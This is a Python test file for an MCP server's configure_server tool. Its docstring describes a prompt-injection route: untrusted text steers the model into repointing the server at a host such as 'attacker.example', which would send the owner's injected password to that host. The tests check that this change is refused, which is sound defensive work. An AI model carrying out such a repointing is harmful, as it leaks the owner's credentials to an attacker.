"""Spawn-injected credentials never follow a model-chosen host (SEC-253).

``configure_server`` applies partial updates on top of the *live* settings, so
every field it isn't given is inherited — password included. In a Condor-spawned
process that password is the server owner's, injected on the env by
``build_mcp_servers_for_session``, which made ``configure_server(host=…)`` a
one-call exfiltration primitive: rebuild the URL around any host, then
``initialize(force=True)`` authenticates against it. Untrusted text reaches this
session (token names, bot names, market data), so the prompt's "do not call
configure_server" is guidance, not a control.

These tests pin the enforcement: where the credentials were injected the
mutation is refused before anything is written, reloaded or connected, and where
they were not — a standalone uvx/``.mcp.json`` launch — the old behaviour is
untouched.

The repo has no async test setup, so the coroutines are driven with
asyncio.run() instead of a pytest-asyncio marker.
"""

import asyncio

import pytest

from mcp_servers.hummingbot_api import server as hb_server
from mcp_servers.hummingbot_api import settings as settings_module
from mcp_servers.hummingbot_api.settings import settings

OWNER_USER = "condor-api-user"
OWNER_PASSWORD = "sup3r-s3cret-api-password"
EVIL_HOST = "attacker.example"


class FakeClient:
    """Records whether anything tried to reconnect."""

    def __init__(self):
        self.closed = False
        self.initialized = False

    async def close(self):
        self.closed = True

    async def initialize(self, force: bool = False):
        self.initialized = True


@pytest.fixture
def rig(monkeypatch):
    """A pinned server config, a fake client, and a save() that records."""
    monkeypatch.setattr(settings, "server_name", "prod", raising=False)
    monkeypatch.setattr(settings, "api_url", "http://10.0.0.5:8000", raising=False)
    monkeypatch.setattr(settings, "api_username", OWNER_USER, raising=False)
    monkeypatch.setattr(settings, "api_password", OWNER_PASSWORD, raising=False)

    client = FakeClient()
    monkeypatch.setattr(hb_server, "hummingbot_client", client)

    saved: list = []
    monkeypatch.setattr(settings_module, "save_server_config", saved.append)

    # Default to a standalone launch; the injected cases opt in explicitly.
    monkeypatch.delenv("HUMMINGBOT_API_USERNAME", raising=False)
    monkeypatch.delenv("HUMMINGBOT_API_PASSWORD", raising=False)

    return client, saved


def test_injected_credentials_never_reach_a_model_chosen_host(rig, monkeypatch):
    """The exfiltration primitive: repointing must not connect with the owner's creds."""
    client, saved = rig
    monkeypatch.setenv("HUMMINGBOT_API_USERNAME", OWNER_USER)
    monkeypatch.setenv("HUMMINGBOT_API_PASSWORD", OWNER_PASSWORD)

    result = asyncio.run(hb_server.configure_server(host=EVIL_HOST))

    assert not client.initialized, "authenticated against a model-chosen host"
    assert not client.closed, "tore down the pinned connection"
    assert settings.api_url == "http://10.0.0.5:8000", "settings were repointed"
    assert EVIL_HOST not in result
    assert OWNER_PASSWORD not in result
    assert "Settings → Servers" in result


def test_injected_credentials_are_not_written_to_disk(rig, monkeypatch):
    """save_server_config would leave the password in cleartext YAML, machine-global."""
    _client, saved = rig
    monkeypatch.setenv("HUMMINGBOT_API_USERNAME", OWNER_USER)
    monkeypatch.setenv("HUMMINGBOT_API_PASSWORD", OWNER_PASSWORD)

    asyncio.run(hb_server.configure_server(host=EVIL_HOST, port=9000))

    assert saved == [], "wrote ~/.hummingbot_mcp/server.yml for a spawned process"


def test_password_alone_on_the_env_is_enough_to_refuse(rig, monkeypatch):
    """Either half of the injection means this process holds a secret it was handed."""
    client, saved = rig
    monkeypatch.setenv("HUMMINGBOT_API_PASSWORD", OWNER_PASSWORD)

    asyncio.run(hb_server.configure_server(host=EVIL_HOST))

    assert not client.initialized
    assert saved == []


def test_the_read_only_branch_still_reports_the_active_server(rig, monkeypatch):
    """No parameters is a read; it stays available on a spawned process."""
    client, _saved = rig
    monkeypatch.setenv("HUMMINGBOT_API_USERNAME", OWNER_USER)
    monkeypatch.setenv("HUMMINGBOT_API_PASSWORD", OWNER_PASSWORD)

    result = asyncio.run(hb_server.configure_server())

    assert "prod" in result
    assert "http://10.0.0.5:8000" in result
    assert OWNER_USER in result
    assert OWNER_PASSWORD not in result
    assert not client.initialized


def test_a_standalone_launch_still_configures_and_persists(rig):
    """No injected credentials → the uvx/.mcp.json path is unchanged."""
    client, saved = rig

    result = asyncio.run(hb_server.configure_server(host="localhost", port=8000))

    assert client.closed and client.initialized
    assert settings.api_url == "http://localhost:8000"
    assert len(saved) == 1
    assert saved[0].url == "http://localhost:8000"
    assert "connected successfully" in result
